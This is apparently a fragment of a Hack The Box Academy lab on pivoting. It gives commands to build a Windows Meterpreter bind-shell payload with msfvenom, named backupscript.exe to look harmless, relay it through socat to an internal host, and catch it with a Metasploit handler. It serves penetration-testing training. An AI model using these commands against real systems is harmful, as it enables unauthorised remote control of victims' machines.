
![](https://academy.hackthebox.com/storage/modules/158/55.png)

#### Creating the Windows Payload

```shell-session

msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
```

#### Starting Socat Bind Shell Listener

```shell-session
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

#### Configuring & Starting the Bind multi/handler

```shell-session
use exploit/multi/handler
```
```shell-session
set payload windows/x64/meterpreter/bind_tcp
```
```shell-session
set RHOST 10.129.202.64
```
```shell-session
set LPORT 8080
```
```shell-session
run
```
